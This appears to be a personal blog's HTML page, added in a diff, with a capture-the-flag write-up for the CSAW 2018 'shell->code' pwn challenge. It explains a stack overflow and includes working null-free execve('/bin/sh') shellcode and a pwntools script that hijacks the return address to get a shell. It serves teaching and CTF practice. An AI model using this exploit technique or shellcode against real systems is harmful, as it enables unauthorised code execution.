@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>shell-&gt;code -- CSAW2018 Quals - Pedro Bernardo</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Points: 100
+Solves: 261
+Description:
+Linked lists are great! They let you chain pieces of data together.
+nc pwn.chal.csaw.io 9005
+flag format: flag{...}
+Given:
+shellpointcode
+Introduction shell-&gt;code was a 100 points pwn challenge on the CSAW’18 CTF Qualification Round
+Reversing (The Problem) The clue was: &ldquo;Linked lists are great! They let you chain pieces of data together&rdquo;
+Running checksec on the binary gives the following result:
+This gives us a few clues already:" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="shell-&gt;code -- CSAW2018 Quals" />
+<meta property="og:description" content="Points: 100
+Solves: 261
+Description:
+Linked lists are great! They let you chain pieces of data together.
+nc pwn.chal.csaw.io 9005
+flag format: flag{...}
+Given:
+shellpointcode
+Introduction shell-&gt;code was a 100 points pwn challenge on the CSAW’18 CTF Qualification Round
+Reversing (The Problem) The clue was: &ldquo;Linked lists are great! They let you chain pieces of data together&rdquo;
+Running checksec on the binary gives the following result:
+This gives us a few clues already:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/blog/posts/2018-09-20-csaw18_shell-%5Ccode/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2018-09-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2018-09-20T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="shell-&gt;code -- CSAW2018 Quals"/>
+<meta name="twitter:description" content="Points: 100
+Solves: 261
+Description:
+Linked lists are great! They let you chain pieces of data together.
+nc pwn.chal.csaw.io 9005
+flag format: flag{...}
+Given:
+shellpointcode
+Introduction shell-&gt;code was a 100 points pwn challenge on the CSAW’18 CTF Qualification Round
+Reversing (The Problem) The clue was: &ldquo;Linked lists are great! They let you chain pieces of data together&rdquo;
+Running checksec on the binary gives the following result:
+This gives us a few clues already:"/>
+<script src="//localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="//localhost:1313/css/fonts.0db1b638c3c6b12e3f0bf5303b558492d936bf9102ec4c4ba2bdc315e2a4184f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"   />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Pedro Bernardo</a>
+	</div>
+	<nav>
+		
+		<a href="/blog">Blog</a>
+		
+		<a href="/blog/posts">All posts</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/">CV</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">shell-&gt;code -- CSAW2018 Quals</h1>
+			<div class="meta">Posted on Sep 20, 2018</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<p><strong>Points:</strong> 100</p>
+<p><strong>Solves:</strong> 261</p>
+<p><strong>Description:</strong></p>
+<blockquote>
+<p>Linked lists are great! They let you chain pieces of data together.</p>
+<p><code>nc pwn.chal.csaw.io 9005</code></p>
+<p>flag format: <code>flag{...}</code></p>
+</blockquote>
+<p><strong>Given:</strong></p>
+<p><a href="shellpointcode">shellpointcode</a></p>
+<h1 id="introduction">Introduction</h1>
+<p>shell-&gt;code was a 100 points pwn challenge on the CSAW’18 CTF Qualification Round</p>
+<h1 id="reversing-the-problem">Reversing (The Problem)</h1>
+<p>The clue was: &ldquo;Linked lists are great! They let you chain pieces of data together&rdquo;</p>
+<p>Running checksec on the binary gives the following result:</p>
+<p><img src="checksec.png" alt=""></p>
+<p>This gives us a few clues already:</p>
+<ol>
+<li>NX is disabled and there are RWX segments, which points to possible shellcode injection.</li>
+<li>Full RELRO means that we can&rsquo;t overwrite the GOT.</li>
+<li>No stack canary, which points to a possible buffer overflow vulnerability.</li>
+</ol>
+<p>Running the program, it asks twice for 15 bytes of data, to store on two separate linked list nodes, node 1 and node 2. Then it leaks the second node&rsquo;s address through the &ldquo;next&rdquo; pointer in the first node.
+Finally, it asks for our initials and then prints a goodbye message using our input.</p>
+<p>Let&rsquo;s check it out in IDA Free:</p>
+<p><img src="nononode.png" alt=""></p>
+<p>Here we can confirm that we are only allowed to store the 15 bytes the program asks for, so no overflows in this part. However, we can see a call to the goodbye function which, I assume, is where the programs asks for our initials and says goodbye.</p>
+<p><img src="goodbye_overflow.png" alt=""></p>
+<p>And indeed, we see the stack frame growing 16 bytes, and fgets reading 0x20 bytes into [rbp - 3], which means we have 29 bytes of overflow.</p>
+<p>Testing it out wields the following result:</p>
+<p><img src="segfault.png" alt=""></p>
+<p>Aha! Just as we expected. So, there&rsquo;s our buffer overflow. With this, we should have enough space to overwrite the saved return address. Let&rsquo;s find out the offset between our input and the saved return address in gdb.</p>
+<p><img src="offset.png" alt=""></p>
+<p>The highlighted value is what we want to overwrite and it&rsquo;s 11 bytes away from where our input is stored.</p>
+<p>Now the only thing left to know is where the nodes are, relative to each other, so we can have the big picture of what&rsquo;s going on.
+Again using gdb, we can see that node 2 (lower address) is higher than node 1 (higher address) on the stack, 32 bytes appart.</p>
+<p><img src="node_off.png" alt=""></p>
+<p>(node 1 is filled with A&rsquo;s (0x41) and node 2 is filled with B&rsquo;s (0x42))</p>
+<h1 id="the-solution">The Solution</h1>
+<p>Recap:
+We have a leak from an address where we can store 15 bytes of data and we know the offset from this address to the other address where we can store another 15 bytes.
+From checksec, we know the binary doesn&rsquo;t have NX enabled, so we can execute code on the stack.</p>
+<p>I solved this challenge by injecting shellcode in both nodes, and jumping between them with a short jump to save space. The script was developed in python using the pwntools library.</p>
+<p>We have to keep in mind that fgets stops when it sees a \x00, so our shellcode can&rsquo;t have any of those.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>   ; complement of &#34;/bin/sh\x00&#34;
+</span></span><span style="display:flex;"><span>   mov rbx, 0xff978cd091969dd0
+</span></span><span style="display:flex;"><span>   not rbx
+</span></span><span style="display:flex;"><span>   jmp short $+20
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   xor rsi, rsi
+</span></span><span style="display:flex;"><span>   push 59
+</span></span><span style="display:flex;"><span>   pop rax
+</span></span><span style="display:flex;"><span>   push rbx
+</span></span><span style="display:flex;"><span>   mov rdi, rsp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   syscall
+</span></span></code></pre></div><p>First, the complement of &ldquo;/bin/sh\x00&rdquo; is moved into the rbx register, and then, before we push rbx we run a not on it. This way, we can push &ldquo;/bin/sh\x00&rdquo; without any 0&rsquo;s in our code.
+Then I found the exact offset on gdb to where we wanted our code to jump to and hardcoded it. The rest is straightforward x86-64, avoiding instructions with 0&rsquo;s in them.
+This code is 27 bytes long and calls sys_execve(&quot;/bin/sh\x00&quot;, null, null). It&rsquo;s split into 15 bytes in node 2 and 12 bytes in node 1.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#!/usr/bin/env python2.7</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span>binary_path <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;./shellpointcode&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SERVER <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;pwn.chal.csaw.io&#34;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">9005</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Change to False to interact with the server</span>
+</span></span><span style="display:flex;"><span>local <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">False</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> local:
+</span></span><span style="display:flex;"><span>   p <span style="color:#ff7b72;font-weight:bold">=</span> process(binary_path, timeout<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">9999</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">else</span>:
+</span></span><span style="display:flex;"><span>   p <span style="color:#ff7b72;font-weight:bold">=</span> remote(SERVER, PORT, timeout<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">9999</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    xor rsi, rsi
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    push 59
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    pop rax
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    push rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    mov rdi, rsp
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>node_1 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x48\x31\xf6\x6a\x3b\x58\x53\x48\x89\xe7\x0f\x05</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    mov rbx, 0xff978cd091969dd0
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    not rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    jmp short $+20
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>node_2 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\xeb\x12</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;A&#39;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">11</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendline(node_1)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendline(node_2)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;node.next:&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># parse the leaked address</span>
+</span></span><span style="display:flex;"><span>node_2_addr <span style="color:#ff7b72;font-weight:bold">=</span> p<span style="color:#ff7b72;font-weight:bold">.</span>recvline()
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">we add 8 to the leaked address, because our input is at
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">offset 8 from the start of node 2 which is the leaked address,
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">being the first 8 bytes reserved to the pointer to the next node on the list.
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>rip <span style="color:#ff7b72;font-weight:bold">=</span> p64(int(node_2_addr, <span style="color:#a5d6ff">16</span>) <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">8</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendline(padding <span style="color:#ff7b72;font-weight:bold">+</span> rip)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div><p>Now we run the script and get the flag!</p>
+<p><img src="win.png" alt=""></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/csaw18">csaw18</a></li>
+					
+					<li><a href="/tags/pwn">pwn</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://example.com" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="BlueSky"><i data-feather="bluesky"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
